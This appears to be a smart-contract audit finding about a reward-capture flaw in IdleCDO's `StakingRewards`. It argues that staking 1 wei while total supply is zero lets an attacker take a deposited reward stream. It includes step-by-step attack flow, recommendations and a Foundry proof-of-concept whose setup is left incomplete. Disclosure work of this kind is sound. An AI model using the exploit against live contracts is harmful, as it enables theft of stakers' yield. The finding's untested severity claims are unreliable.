### Title
First/sole staker captures the entire reward stream in `StakingRewards` because `depositReward` does not require a minimum `totalSupply` — ([File: contracts/StakingRewards.sol](contracts/StakingRewards.sol))

### Summary
`StakingRewards` (the contract used by `IdleCDO` to distribute reward/fee tokens to tranche-token stakers, via `rewardsDistribution`/`stakeFor`) implements the Synthetix `rewardPerToken` pattern with a fixed `1e18` scalar and a permissionless `stake()`. When `depositReward()` is called while `_totalSupply` is zero or dust, an unprivileged attacker can stake 1 wei of the tranche token and become the sole recipient of essentially the entire streamed reward.

### Finding Description
`rewardPerToken()` divides the newly emitted reward amount by `_totalSupply`:

```solidity
// contracts/StakingRewards.sol
function rewardPerToken() public view returns (uint256) {
    if (_totalSupply == 0) {
        return rewardPerTokenStored;
    }
    return rewardPerTokenStored + ((lastTimeRewardApplicable() - lastUpdateTime) * rewardRate * 1e18 / _totalSupply);
}
```

`depositReward()` (called by `rewardsDistribution`, i.e. the IdleCDO depositing harvested rewards/fees) sets `rewardRate` and starts `periodFinish` without any check that `_totalSupply` exceeds a sane threshold, and with `account = address(0)` so no per-user accrual is performed:

```solidity
function depositReward(address, uint256 reward) external onlyRewardsDistribution updateReward(address(0)) {
    if (shouldTransfer) {
        rewardsToken.safeTransferFrom(msg.sender, address(this), reward);
    }
    ...
    lastUpdateTime = block.timestamp;
    periodFinish = block.timestamp + rewardsDuration;
}
```

`stake()` is permissionless (no whitelist, unlike `DelegateStakingRewardsIDLE` which gates `_stake` behind `whitelist`). The attacker flow:

1. Reward pool has `_totalSupply == 0` (fresh deployment, or after all stakers exited — `withdraw`/`exit` are unrestricted).
2. Honest `rewardsDistribution` calls `depositReward(reward)`, streaming `reward` over `rewardsDuration`.
3. Attacker (any EOA holding tranche tokens, e.g. a KYC-passing lender) calls `stake(1)` in the next block. `_totalSupply = 1`, `_balances[attacker] = 1`.
4. Over `rewardsDuration`, `earned(attacker)` converges to `1 * (rewardRate * duration * 1e18 / 1) / 1e18 = reward` — the attacker accrues ~the entire deposit.
5. Attacker calls `getReward()`/`exit()` and drains `rewardsToken`.

Legitimate later stakers only dilute the attacker proportionally to their stake for the remaining time; with a 1-wei head start the attacker captures the reward accrued up to that point (stored via `updateReward` on each interaction).

### Impact Explanation
Direct theft of yield: up to the full `reward` amount deposited in each `depositReward` call made while supply is zero/dust. This mirrors the external report's "steal all tokens in the reward pool" impact — the honest `stakeFor` staker (e.g. `feeReceiver`) receives nothing. The broken invariant is fair reward distribution; the `balance / rewardsDuration` check only bounds `rewardRate` against the token balance and does not protect against tiny-supply accrual.

### Likelihood Explanation
Requires the honest privileged call `depositReward` to execute while `_totalSupply` is zero or near-zero. This occurs naturally at initialization (the exact condition in the external report), after a period where all stakers exited, or whenever reward deposits are triggered before `stakeFor` runs. It costs the attacker only a dust tranche-token balance plus gas, and the window repeats every reward period.

### Recommendation
- Revert in `depositReward` if `_totalSupply` is below a minimum threshold (e.g. `1e18`), or require the staking token to be seeded before rewards are queued.
- Alternatively make `stake`/`stakeFor` whitelisted or restrict reward accrual so that a dust-supply period cannot produce outsized `rewardPerToken` deltas (e.g. cap effective supply or use higher-precision per-share accounting).

### Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {StakingRewards} from "../contracts/StakingRewards.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

// Fork mainnet; use a live tranche token + reward token, or mocks.
contract StakingRewardsDustSupplyTest is Test {
    StakingRewards sr;
    address rewardsDistribution = address(0xCD0); // IdleCDO stand-in
    IERC20Detailed stakingToken;                  // tranche token
    IERC20Detailed rewardToken;                   // e.g. underlying/reward token
    address attacker = address(0xA77AC);

    function setUp() public {
        // deploy + initialize StakingRewards with stakingToken/rewardToken,
        // rewardsDistribution = rewardsDistribution
        sr.initialize(rewardsDistribution, address(rewardToken), address(stakingToken), address(this), true);
        // fund rewardsDistribution with rewardToken and approve sr
    }

    function testSoleStakerDrainsRewards() public {
        uint256 reward = 1_000e18;
        // _totalSupply == 0
        vm.prank(rewardsDistribution);
        sr.depositReward(address(0), reward);      // starts period, no supply check

        vm.prank(attacker);
        sr.stake(1);                               // dust stake, permissionless

        skip(1 days);                              // rewardsDuration

        assertApproxEqAbs(sr.earned(attacker), reward, 1);

        uint256 balBefore = rewardToken.balanceOf(attacker);
        vm.prank(attacker);
        sr.getReward();
        assertGt(rewardToken.balanceOf(attacker) - balBefore, reward - 2);
    }
}
```

Caveat: I verified the code path in `contracts/StakingRewards.sol` and `contracts/DelegateStakingRewardsIDLE.sol` directly. `DelegateStakingRewardsIDLE` carries the identical math but its whitelist reduces (not eliminates — whitelisted users are still unprivileged actors) exploitability, so `StakingRewards` is the stronger analog.
